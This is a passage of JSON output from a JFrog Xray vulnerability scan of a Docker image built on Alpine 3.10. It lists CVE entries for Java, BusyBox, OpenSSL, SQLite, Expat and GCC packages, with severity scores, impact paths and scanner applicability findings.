                    "description": "Vulnerability in the Oracle Java SE, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: JAXP). Supported versions that are affected are Oracle Java SE: 7u321, 8u311, 11.0.13, 17.0.1; Oracle GraalVM Enterprise Edition: 20.3.4 and 21.3.0. Easily exploitable vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Oracle Java SE, Oracle GraalVM Enterprise Edition. Successful attacks of this vulnerability can result in unauthorized read access to a subset of Oracle Java SE, Oracle GraalVM Enterprise Edition accessible data. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability can also be exploited by using APIs in the specified Component, e.g., through a web service which supplies data to the APIs. CVSS 3.1 Base Score 5.3 (Confidentiality impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N).",
                    "issue_type": "security",
                    "severity": "Medium",
                    "provider": "JFrog",
                    "cves": [
                        {
                            "cve": "CVE-2022-21296",
                            "cwe": [
                                "NVD-CWE-noinfo"
                            ],
                            "cvss_v2": "5.0/CVSS:2.0/AV:N/AC:L/Au:N/C:P/I:N/A:N",
                            "cvss_v3": "5.3/CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N"
                        }
                    ],
                    "created": "2022-01-20T00:00:00.426Z",
                    "impact_path": [
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:openjdk8-jre-base:8.275.01-r0",
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:openjdk8-jre-lib:8.275.01-r0",
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:openjdk8-jre:8.275.01-r0"
                    ],
                    "applicability": null,
                    "applicability_details": [
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "",
                            "vulnerability_id": "CVE-2022-21296",
                            "result": "not_covered"
                        }
                    ]
                },
                {
                    "issue_id": "XRAY-203005",
                    "summary": "BusyBox through 1.35.0 allows remote attackers to execute arbitrary code if netstat is used to print a DNS PTR record's value to a VT compatible terminal. Alternatively, the attacker could choose to change the terminal's colors.",
                    "description": "BusyBox through 1.35.0 allows remote attackers to execute arbitrary code if netstat is used to print a DNS PTR record's value to a VT compatible terminal. Alternatively, the attacker could choose to change the terminal's colors.",
                    "issue_type": "security",
                    "severity": "High",
                    "provider": "JFrog",
                    "cves": [
                        {
                            "cve": "CVE-2022-28391",
                            "cwe": [
                                "NVD-CWE-noinfo"
                            ],
                            "cvss_v2": "6.8/CVSS:2.0/AV:N/AC:M/Au:N/C:P/I:P/A:P",
                            "cvss_v3": "8.8/CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H"
                        }
                    ],
                    "created": "2022-04-04T00:00:00.873Z",
                    "impact_path": [
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__26d14edc4f17638cda363ea80b29c55e83058fc0dff1129b38ea3e8231217f7d.tar.gz/3.10:busybox:1.30.1-r5",
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__26d14edc4f17638cda363ea80b29c55e83058fc0dff1129b38ea3e8231217f7d.tar.gz/3.10:ssl_client:1.30.1-r5"
                    ],
                    "extended_information": {
                        "short_description": "Escape sequence injection in BusyBox's netstat results in unspecified impact (code execution if using some extreme-legacy terminal emulators).",
                        "full_description": "`netstat` is a command line utility that displays active TCP connections, recent UDP transmissions, and listening sockets.\n\nIn [BusyBox](https://busybox.net/)'s `netstat` implementation, a vulnerability exists in which DNS PTR record values are not sanitized for escape characters before printing. This issue affects Virtual Terminal emulators, in which special escape characters may be used to command the terminal, and may even result in code execution, although there is no available exploit demonstrating this. The lack of RCE PoC code is due to the fact that no modern terminal emulator allows code execution via escape characters.\n\nTo exploit this vulnerability, an attacker must be able to carry out a DNS poisoning attack, so that a query from a vulnerable machine is answered with a malicious response (i.e. when trying to connect to a certain host), containing Virtual Terminal escape characters. Additionally, `netstat` must be executed at the same time from a VT emulator, so that the DNS response containing the malicious hostname is printed and interpreted by the VT as an escaped command.",
                        "jfrog_research_severity": "Low",
                        "jfrog_research_severity_reasons": [
                            {
                                "name": "The issue can be exploited by attackers over the network",
                                "description": "The vulnerability is triggered over DNS",
                                "is_positive": false
                            },
                            {
                                "name": "The issue has an exploit published",
                                "description": "Publish exploit demonstrates an attack with a payload that changes terminal colors",
                                "is_positive": false
                            },
                            {
                                "name": "The reported CVSS was either wrongly calculated, downgraded by other vendors, or does not reflect the vulnerability's impact",
                                "description": "The Attack Complexity for this vulnerability is \"Low\", but should be \"High\". Moreover, \"Confidentiality\" is \"High\", but exploitation impact is context-dependent and cannot be presumed",
                                "is_positive": true
                            },
                            {
                                "name": "The prerequisites for exploiting the issue are extremely unlikely",
                                "description": "Exploitation depends on the target system using (i.e. automatically calling, or by user interaction) `netstat` from a VT emulator after trying to connect to a spoofed host. No modern terminal emulator allows code execution via escape characters.",
                                "is_positive": true
                            },
                            {
                                "name": "The issue cannot result in a severe impact (such as remote code execution)",
                                "description": "No modern terminal emulator allows code execution via escape characters",
                                "is_positive": true
                            }
                        ]
                    },
                    "applicability": [
                        {
                            "scanner_available": true,
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:busybox:1.30.1-r5",
                            "cve_id": "CVE-2022-28391",
                            "scan_status": 1,
                            "applicability": null,
                            "evidence": null,
                            "info": "Applicability cannot be determined since exploitation depends on user interaction. Specifically - the user must run the \"netstat\" CLI tool at exactly the same time that a DNS poisoning attack is made.",
                            "details": null
                        },
                        {
                            "scanner_available": true,
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:ssl_client:1.30.1-r5",
                            "cve_id": "CVE-2022-28391",
                            "scan_status": 1,
                            "applicability": null,
                            "evidence": null,
                            "info": "Applicability cannot be determined since exploitation depends on user interaction. Specifically - the user must run the \"netstat\" CLI tool at exactly the same time that a DNS poisoning attack is made.",
                            "details": null
                        }
                    ],
                    "applicability_details": [
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:busybox:1.30.1-r5",
                            "vulnerability_id": "CVE-2022-28391",
                            "result": "undetermined"
                        },
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:ssl_client:1.30.1-r5",
                            "vulnerability_id": "CVE-2022-28391",
                            "result": "undetermined"
                        }
                    ]
                },
                {
                    "issue_id": "XRAY-607877",
                    "summary": "Issue summary: Calling the OpenSSL API function SSL_select_next_proto with an\nempty supported client protocols buffer may cause a crash or memory contents to\nbe sent to the peer.\n\nImpact summary: A buffer overread can have a range of potential consequences\nsuch as unexpected application beahviour or a crash. In particular this issue\ncould result in up to 255 bytes of arbitrary private data from memory being sent\nto the peer leading to a loss of confidentiality. However, only applications\nthat directly call the SSL_select_next_proto function with a 0 length list of\nsupported client protocols are affected by this issue. This would normally never\nbe a valid scenario and is typically not under attacker control but may occur by\naccident in the case of a configuration or programming error in the calling\napplication.\n\nThe OpenSSL API function SSL_select_next_proto is typically used by TLS\napplications that support ALPN (Application Layer Protocol Negotiation) or NPN\n(Next Protocol Negotiation). NPN is older, was never standardised and\nis deprecated in favour of ALPN. We believe that ALPN is significantly more\nwidely deployed than NPN. The SSL_select_next_proto function accepts a list of\nprotocols from the server and a list of protocols from the client and returns\nthe first protocol that appears in the server list that also appears in the\nclient list. In the case of no overlap between the two lists it returns the\nfirst item in the client list. In either case it will signal whether an overlap\nbetween the two lists was found. In the case where SSL_select_next_proto is\ncalled with a zero length client list it fails to notice this condition and\nreturns the memory immediately following the client list pointer (and reports\nthat there was no overlap in the lists).\n\nThis function is typically called from a server side application callback for\nALPN or a client side application callback for NPN. In the case of ALPN the list\nof protocols supplied by the client is guaranteed by libssl to never be zero in\nlength. The list of ...",
                    "description": "Issue summary: Calling the OpenSSL API function SSL_select_next_proto with an\nempty supported client protocols buffer may cause a crash or memory contents to\nbe sent to the peer.\n\nImpact summary: A buffer overread can have a range of potential consequences\nsuch as unexpected application beahviour or a crash. In particular this issue\ncould result in up to 255 bytes of arbitrary private data from memory being sent\nto the peer leading to a loss of confidentiality. However, only applications\nthat directly call the SSL_select_next_proto function with a 0 length list of\nsupported client protocols are affected by this issue. This would normally never\nbe a valid scenario and is typically not under attacker control but may occur by\naccident in the case of a configuration or programming error in the calling\napplication.\n\nThe OpenSSL API function SSL_select_next_proto is typically used by TLS\napplications that support ALPN (Application Layer Protocol Negotiation) or NPN\n(Next Protocol Negotiation). NPN is older, was never standardised and\nis deprecated in favour of ALPN. We believe that ALPN is significantly more\nwidely deployed than NPN. The SSL_select_next_proto function accepts a list of\nprotocols from the server and a list of protocols from the client and returns\nthe first protocol that appears in the server list that also appears in the\nclient list. In the case of no overlap between the two lists it returns the\nfirst item in the client list. In either case it will signal whether an overlap\nbetween the two lists was found. In the case where SSL_select_next_proto is\ncalled with a zero length client list it fails to notice this condition and\nreturns the memory immediately following the client list pointer (and reports\nthat there was no overlap in the lists).\n\nThis function is typically called from a server side application callback for\nALPN or a client side application callback for NPN. In the case of ALPN the list\nof protocols supplied by the client is guaranteed by libssl to never be zero in\nlength. The list of ...",
                    "issue_type": "security",
                    "severity": "Low",
                    "provider": "JFrog",
                    "cves": [
                        {
                            "cve": "CVE-2024-5535"
                        }
                    ],
                    "created": "2024-06-29T00:00:00.700Z",
                    "impact_path": [
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__26d14edc4f17638cda363ea80b29c55e83058fc0dff1129b38ea3e8231217f7d.tar.gz/3.10:libcrypto1.1:1.1.1k-r0",
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__26d14edc4f17638cda363ea80b29c55e83058fc0dff1129b38ea3e8231217f7d.tar.gz/3.10:libssl1.1:1.1.1k-r0"
                    ],
                    "applicability": [
                        {
                            "scanner_available": true,
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:libcrypto1.1:1.1.1k-r0",
                            "cve_id": "CVE-2024-5535",
                            "scan_status": 1,
                            "applicability": false,
                            "scanner_explanation": "<p>The scanner checks whether any of the following vulnerable functions are called:</p>\n<ul>\n<li><code>SSL_CTX_set_alpn_select_cb</code></li>\n<li><code>SSL_CTX_set_next_proto_select_cb</code></li>\n<li><code>SSL_select_next_proto</code></li>\n</ul>",
                            "evidence": null,
                            "info": "No references to the vulnerable function were found",
                            "details": null
                        },
                        {
                            "scanner_available": true,
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:libssl1.1:1.1.1k-r0",
                            "cve_id": "CVE-2024-5535",
                            "scan_status": 1,
                            "applicability": false,
                            "scanner_explanation": "<p>The scanner checks whether any of the following vulnerable functions are called:</p>\n<ul>\n<li><code>SSL_CTX_set_alpn_select_cb</code></li>\n<li><code>SSL_CTX_set_next_proto_select_cb</code></li>\n<li><code>SSL_select_next_proto</code></li>\n</ul>",
                            "evidence": null,
                            "info": "No references to the vulnerable function were found",
                            "details": null
                        }
                    ],
                    "applicability_details": [
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:libcrypto1.1:1.1.1k-r0",
                            "vulnerability_id": "CVE-2024-5535",
                            "result": "not_applicable"
                        },
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:libssl1.1:1.1.1k-r0",
                            "vulnerability_id": "CVE-2024-5535",
                            "result": "not_applicable"
                        }
                    ]
                },
                {
                    "issue_id": "XRAY-632772",
                    "summary": "Issue summary: Applications performing certificate name checks (e.g., TLS\nclients checking server certificates) may attempt to read an invalid memory\naddress resulting in abnormal termination of the application process.\n\nImpact summary: Abnormal termination of an application can a cause a denial of\nservice.\n\nApplications performing certificate name checks (e.g., TLS clients checking\nserver certificates) may attempt to read an invalid memory address when\ncomparing the expected name with an `otherName` subject alternative name of an\nX.509 certificate. This may result in an exception that terminates the\napplication program.\n\nNote that basic certificate chain validation (signatures, dates, ...) is not\naffected, the denial of service can occur only when the application also\nspecifies an expected DNS name, Email address or IP address.\n\nTLS servers rarely solicit client certificates, and even when they do, they\ngenerally don't perform a name check against a reference identifier (expected\nidentity), but rather extract the presented identity after checking the\ncertificate chain.  So TLS servers are generally not affected and the severity\nof the issue is Moderate.\n\nThe FIPS modules in 3.3, 3.2, 3.1 and 3.0 are not affected by this issue.",
                    "description": "Issue summary: Applications performing certificate name checks (e.g., TLS\nclients checking server certificates) may attempt to read an invalid memory\naddress resulting in abnormal termination of the application process.\n\nImpact summary: Abnormal termination of an application can a cause a denial of\nservice.\n\nApplications performing certificate name checks (e.g., TLS clients checking\nserver certificates) may attempt to read an invalid memory address when\ncomparing the expected name with an `otherName` subject alternative name of an\nX.509 certificate. This may result in an exception that terminates the\napplication program.\n\nNote that basic certificate chain validation (signatures, dates, ...) is not\naffected, the denial of service can occur only when the application also\nspecifies an expected DNS name, Email address or IP address.\n\nTLS servers rarely solicit client certificates, and even when they do, they\ngenerally don't perform a name check against a reference identifier (expected\nidentity), but rather extract the presented identity after checking the\ncertificate chain.  So TLS servers are generally not affected and the severity\nof the issue is Moderate.\n\nThe FIPS modules in 3.3, 3.2, 3.1 and 3.0 are not affected by this issue.",
                    "issue_type": "security",
                    "severity": "Low",
                    "provider": "JFrog",
                    "cves": [
                        {
                            "cve": "CVE-2024-6119",
                            "cwe": [
                                "CWE-843"
                            ],
                            "cvss_v3": "7.5/CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
                        }
                    ],
                    "created": "2024-09-03T00:00:00.909Z",
                    "impact_path": [
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__26d14edc4f17638cda363ea80b29c55e83058fc0dff1129b38ea3e8231217f7d.tar.gz/3.10:libssl1.1:1.1.1k-r0",
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__26d14edc4f17638cda363ea80b29c55e83058fc0dff1129b38ea3e8231217f7d.tar.gz/3.10:libcrypto1.1:1.1.1k-r0"
                    ],
                    "extended_information": {
                        "short_description": "Out of bounds read in OpenSSL clients can lead to denial of service when using non-default TLS verification options and connecting to malicious TLS servers.",
                        "jfrog_research_severity": "Medium",
                        "jfrog_research_severity_reasons": [
                            {
                                "name": "The issue has an exploit published",
                                "description": "The fix commit contains PoC certificates that trigger the denial of service issue",
                                "is_positive": false
                            },
                            {
                                "name": "The issue cannot result in a severe impact (such as remote code execution)",
                                "description": "Denial of service of a TLS clients only. This out of bounds read cannot lead to data disclosure.",
                                "is_positive": true
                            },
                            {
                                "name": "The prerequisites for exploiting the issue are extremely unlikely",
                                "description": "The attacker must make the victim client connect to their malicious TLS server, in order to serve the malformed TLS certificate. The victim client must use OpenSSL and must enable non-default certificate verification options, either -\n\n* DNS verification - by using `X509_VERIFY_PARAM_set1_host` or `X509_check_host`\n* Email verification - by using ` X509_VERIFY_PARAM_set1_email` or `X509_check_email`",
                                "is_positive": true
                            }
                        ]
                    },
                    "applicability": [
                        {
                            "scanner_available": true,
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:libcrypto1.1:1.1.1k-r0",
                            "cve_id": "CVE-2024-6119",
                            "scan_status": 1,
                            "applicability": false,
                            "scanner_explanation": "<p>The scanner checks whether any of the following vulnerable functions are called:</p>\n<ul>\n<li>\n<p><code>X509_VERIFY_PARAM_set1_email</code></p>\n</li>\n<li>\n<p><code>X509_check_email</code></p>\n</li>\n<li>\n<p><code>X509_VERIFY_PARAM_set1_host</code></p>\n</li>\n<li>\n<p><code>X509_check_host</code></p>\n</li>\n</ul>",
                            "evidence": null,
                            "info": "No references to the vulnerable function were found",
                            "details": null
                        },
                        {
                            "scanner_available": true,
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:libssl1.1:1.1.1k-r0",
                            "cve_id": "CVE-2024-6119",
                            "scan_status": 1,
                            "applicability": false,
                            "scanner_explanation": "<p>The scanner checks whether any of the following vulnerable functions are called:</p>\n<ul>\n<li>\n<p><code>X509_VERIFY_PARAM_set1_email</code></p>\n</li>\n<li>\n<p><code>X509_check_email</code></p>\n</li>\n<li>\n<p><code>X509_VERIFY_PARAM_set1_host</code></p>\n</li>\n<li>\n<p><code>X509_check_host</code></p>\n</li>\n</ul>",
                            "evidence": null,
                            "info": "No references to the vulnerable function were found",
                            "details": null
                        }
                    ],
                    "applicability_details": [
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:libcrypto1.1:1.1.1k-r0",
                            "vulnerability_id": "CVE-2024-6119",
                            "result": "not_applicable"
                        },
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:libssl1.1:1.1.1k-r0",
                            "vulnerability_id": "CVE-2024-6119",
                            "result": "not_applicable"
                        }
                    ]
                },
                {
                    "issue_id": "XRAY-99969",
                    "summary": "ext/fts3/fts3_snippet.c in SQLite before 3.32.0 has a NULL pointer dereference via a crafted matchinfo() query.",
                    "description": "ext/fts3/fts3_snippet.c in SQLite before 3.32.0 has a NULL pointer dereference via a crafted matchinfo() query.",
                    "issue_type": "security",
                    "severity": "Medium",
                    "provider": "JFrog",
                    "cves": [
                        {
                            "cve": "CVE-2020-13632",
                            "cwe": [
                                "CWE-476"
                            ],
                            "cvss_v2": "2.1/CVSS:2.0/AV:L/AC:L/Au:N/C:N/I:N/A:P",
                            "cvss_v3": "5.5/CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H"
                        }
                    ],
                    "created": "2020-06-05T00:00:00.010Z",
                    "impact_path": [
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:sqlite-libs:3.28.0-r3"
                    ],
                    "applicability": null,
                    "applicability_details": [
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "",
                            "vulnerability_id": "CVE-2020-13632",
                            "result": "not_covered"
                        }
                    ]
                },
                {
                    "issue_id": "XRAY-196499",
                    "summary": "Vulnerability in the Oracle Java SE, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: ImageIO). Supported versions that are affected are Oracle Java SE: 7u321, 8u311, 11.0.13, 17.0.1; Oracle GraalVM Enterprise Edition: 20.3.4 and 21.3.0. Easily exploitable vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Oracle Java SE, Oracle GraalVM Enterprise Edition. Successful attacks of this vulnerability can result in unauthorized ability to cause a partial denial of service (partial DOS) of Oracle Java SE, Oracle GraalVM Enterprise Edition. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability can also be exploited by using APIs in the specified Component, e.g., through a web service which supplies data to the APIs. CVSS 3.1 Base Score 5.3 (Availability impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L).",
                    "description": "Vulnerability in the Oracle Java SE, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: ImageIO). Supported versions that are affected are Oracle Java SE: 7u321, 8u311, 11.0.13, 17.0.1; Oracle GraalVM Enterprise Edition: 20.3.4 and 21.3.0. Easily exploitable vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Oracle Java SE, Oracle GraalVM Enterprise Edition. Successful attacks of this vulnerability can result in unauthorized ability to cause a partial denial of service (partial DOS) of Oracle Java SE, Oracle GraalVM Enterprise Edition. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability can also be exploited by using APIs in the specified Component, e.g., through a web service which supplies data to the APIs. CVSS 3.1 Base Score 5.3 (Availability impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L).",
                    "issue_type": "security",
                    "severity": "Medium",
                    "provider": "JFrog",
                    "cves": [
                        {
                            "cve": "CVE-2022-21365",
                            "cwe": [
                                "NVD-CWE-noinfo"
                            ],
                            "cvss_v2": "5.0/CVSS:2.0/AV:N/AC:L/Au:N/C:N/I:N/A:P",
                            "cvss_v3": "5.3/CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L"
                        }
                    ],
                    "created": "2022-01-27T00:00:00.887Z",
                    "impact_path": [
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:openjdk8-jre-base:8.275.01-r0",
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:openjdk8-jre-lib:8.275.01-r0",
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:openjdk8-jre:8.275.01-r0"
                    ],
                    "applicability": null,
                    "applicability_details": [
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "",
                            "vulnerability_id": "CVE-2022-21365",
                            "result": "not_covered"
                        }
                    ]
                },
                {
                    "issue_id": "XRAY-194156",
                    "summary": "storeAtts in xmlparse.c in Expat (aka libexpat) before 2.4.3 has an integer overflow.",
                    "description": "storeAtts in xmlparse.c in Expat (aka libexpat) before 2.4.3 has an integer overflow.",
                    "issue_type": "security",
                    "severity": "High",
                    "provider": "JFrog",
                    "cves": [
                        {
                            "cve": "CVE-2022-22827",
                            "cwe": [
                                "CWE-190"
                            ],
                            "cvss_v2": "6.8/CVSS:2.0/AV:N/AC:M/Au:N/C:P/I:P/A:P",
                            "cvss_v3": "8.8/CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H"
                        }
                    ],
                    "created": "2022-01-11T00:00:00.504Z",
                    "impact_path": [
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:expat:2.2.8-r0"
                    ],
                    "applicability": [
                        {
                            "scanner_available": true,
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:expat:2.2.8-r0",
                            "cve_id": "CVE-2022-22827",
                            "scan_status": 1,
                            "applicability": false,
                            "scanner_explanation": "<p>The scanner checks whether any of the following vulnerable functions are called:</p>\n<ul>\n<li><code>XML_Parse</code></li>\n<li><code>XML_ParseBuffer</code></li>\n</ul>",
                            "evidence": null,
                            "info": "No references to the vulnerable function were found",
                            "details": null
                        }
                    ],
                    "applicability_details": [
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:expat:2.2.8-r0",
                            "vulnerability_id": "CVE-2022-22827",
                            "result": "not_applicable"
                        }
                    ]
                },
                {
                    "issue_id": "XRAY-113163",
                    "summary": "The POWER9 backend in GNU Compiler Collection (GCC) before version 10 could optimize multiple calls of the __builtin_darn intrinsic into a single call, thus reducing the entropy of the random number generator. This occurred because a volatile operation was not specified. For example, within a single execution of a program, the output of every __builtin_darn() call may be the same.",
                    "description": "The POWER9 backend in GNU Compiler Collection (GCC) before version 10 could optimize multiple calls of the __builtin_darn intrinsic into a single call, thus reducing the entropy of the random number generator. This occurred because a volatile operation was not specified. For example, within a single execution of a program, the output of every __builtin_darn() call may be the same.",
                    "issue_type": "security",
                    "severity": "High",
                    "provider": "JFrog",
                    "cves": [
                        {
                            "cve": "CVE-2019-15847",
                            "cwe": [
                                "CWE-331"
                            ],
                            "cvss_v2": "5.0/CVSS:2.0/AV:N/AC:L/Au:N/C:P/I:N/A:N",
                            "cvss_v3": "7.5/CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"
                        }
                    ],
                    "created": "2020-07-14T00:00:00.047Z",
                    "impact_path": [
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:libstdc++:8.3.0-r0",
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:libgcc:8.3.0-r0"
                    ],
                    "extended_information": {
                        "short_description": "The gcc random generator for the POWER9 CPU generates repeating, non-random values.",
                        "full_description": "This vulnerability is in the gcc compiler (and not in libgcc) and is only relevant to code compiled for the [POWER9](https://en.wikipedia.org/wiki/POWER9) CPU architecture that uses the DARN random generator. GCC implementation that uses the POWER9 hardware random generator, `__builtin_darn()` and `__builtin_darn_raw()`, produces repeated output, as can be seen in the example in the [GCC bug report](https://gcc.gnu.org/bugzilla/show_bug.cgi?id=91481#c0). This issue is in the specific gcc implementation, and not in the POWER9 random generator itself. Note that this vulnerability could exist in images where the gcc binary itself isn't present, but only binaries that were compiled by the vulnerable version for POWER9.",
                        "jfrog_research_severity": "Medium",
                        "jfrog_research_severity_reasons": [
                            {
                                "name": "The impact of exploiting the issue depends on the context of surrounding software. A severe impact such as RCE is not guaranteed.",
                                "is_positive": true
                            }
                        ]
                    },
                    "applicability": [
                        {
                            "scanner_available": true,
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:libstdc++:8.3.0-r0",
                            "cve_id": "CVE-2019-15847",
                            "scan_status": 1,
                            "applicability": false,
                            "evidence": null,
                            "info": "The CVE is only applicable on IBM POWER9 architecture",
                            "details": null
                        },
                        {
                            "scanner_available": true,
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:libgcc:8.3.0-r0",
                            "cve_id": "CVE-2019-15847",
                            "scan_status": 1,
                            "applicability": false,
                            "evidence": null,
                            "info": "The CVE is only applicable on IBM POWER9 architecture",
                            "details": null
                        }
                    ],
                    "applicability_details": [
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:libstdc++:8.3.0-r0",
                            "vulnerability_id": "CVE-2019-15847",
                            "result": "not_applicable"
                        },
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:libgcc:8.3.0-r0",
